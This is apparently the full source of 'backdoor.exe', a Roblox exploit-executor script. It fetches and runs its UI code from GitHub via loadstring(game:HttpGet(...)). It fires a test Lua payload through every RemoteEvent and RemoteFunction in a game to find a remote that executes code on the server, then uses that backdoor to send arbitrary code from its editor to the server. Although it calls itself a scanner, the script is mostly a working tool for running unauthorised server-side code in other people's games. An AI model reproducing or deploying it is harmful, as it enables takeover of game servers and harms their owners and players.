--[========================================================================[
    backdoor.exe, the best backdoor scanner in Roblox.
    Copyright (C) 2021	iK4oS

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
--]========================================================================]

local genv = getgenv()

if genv.backdoorexe then genv.backdoorexe.screenGui:Destroy() end

local screenGui, uiRequire = loadstring(game:HttpGet("https://raw.githubusercontent.com/ReactorCoreDev/backdoor.exe/v8/src/ui.lua"))()
local alertLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/ReactorCoreDev/backdoor.exe/v8/src/alerts.lua"))()

local ui = uiRequire(screenGui.main)
local config = ui.config
local btns = ui.btns
local editor = ui.editor
local CurrentBackdoor = nil

genv.backdoorexe = {screenGui = screenGui, ui = ui}

local players = game:GetService("Players")
local localPlayer = players.LocalPlayer
local TITLE = "backdoor finder - v8.0.0"

local ALPHABET = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9','!','@','#','$','%','^','&','*','(',')','-','_','=','+','[',']','{','}','|',';',':',',','.','?','/','`','~'}

local BackdoorFound = false
local SearchedForBackdoorAlready = false
local MaxTimeout = 5

local function GenerateRandomString(length)
	local str = ""
	for i = 1, length do
		str = str .. ALPHABET[math.random(1, #ALPHABET)]
	end
	return str
end

local function runRemote(r, args)
	if r:IsA("RemoteEvent") then
		pcall(function() r:FireServer(args) end)
	elseif r:IsA("RemoteFunction") then
		pcall(function() r:InvokeServer(args) end)
	end
end


local function applyMacros(code)
	return 
		code:gsub(
			"%%username%%", localPlayer.Name
		):gsub(
		"%%userid%%", localPlayer.UserId
	):gsub(
		"%%userping%%", localPlayer:GetNetworkPing()
	):gsub(
		"%%debug%%", tostring(config.data.settings.canDebug)
	);
end

local code = nil

local function scanAndFireBackdoors()
	if SearchedForBackdoorAlready then
		local code = applyMacros(editor.getCode());

		runRemote(CurrentBackdoor, code)

		return
	end

	SearchedForBackdoorAlready = true
	ui.title.Text = TITLE .. " [Scanning]"
	alertLib.Info(screenGui, TITLE, "Scan started.", 4)

	local remotes = {}

	for _, remote in ipairs(game:GetDescendants()) do
		if (remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction")) and not remote:IsDescendantOf(game:GetService("RobloxReplicatedStorage")) then
			local code = GenerateRandomString(math.random(12,30))

			remotes[code] = remote

			local payload = [[
				local StringValue = Instance.new("StringValue")
				
				StringValue.Value = "]] .. code .. [["
				
				StringValue.Name = "]] .. code .. [["
				
				game:GetService("Debris"):AddItem(StringValue, 3)
				
				StringValue.Parent = game:GetService("ReplicatedStorage")
			]]

			runRemote(remote, payload)

			print("Fired remote: " .. remote:GetFullName())
		end
	end

	task.spawn(function()
		repeat
			for code, remote in pairs(remotes) do
				local foundItem = game:GetService("ReplicatedStorage"):FindFirstChild(code)
				if foundItem and foundItem:IsA("StringValue") and foundItem.Value == code then
					CurrentBackdoor = remote
					warn("Remote that executed the code: " .. remote:GetFullName())
					BackdoorFound = true
					break
				end
			end
			task.wait(0.1)
		until BackdoorFound
        if BackdoorFound or CurrentBackdoor then
            MaxTimeout = 0
        end
	end)

    task.wait(0.5)
	
	task.wait(MaxTimeout)
	
	if not BackdoorFound then
		ui.title.Text = TITLE .. " [Not Attached Backdoor]"
		alertLib.Info(screenGui, TITLE, "No backdoors found", 4)
		
		task.wait()
		
		SearchedForBackdoorAlready = false
		
		return
	end
	
	ui.title.Text = TITLE .. " [Attached Backdoor]"
	alertLib.Info(screenGui, TITLE, "Attached Backdoor: " .. CurrentBackdoor:GetFullName(), 4)

	alertLib.Info(screenGui, TITLE, "Path of remote is in console to remove", 4)
end

local executing = false

btns.execBtn.MouseButton1Click:Connect(function()
	if executing then return end
	executing = true
	scanAndFireBackdoors()
	executing = false
end)

ui.title.Text = TITLE

alertLib.Success(screenGui, TITLE, "Backdoor scanner successfully loaded.")
alertLib.Info(screenGui, TITLE, "Home to toggle ui.", 5)
alertLib.Info(screenGui, TITLE, "Recontinued by ReactorCoreDev!!", 10)
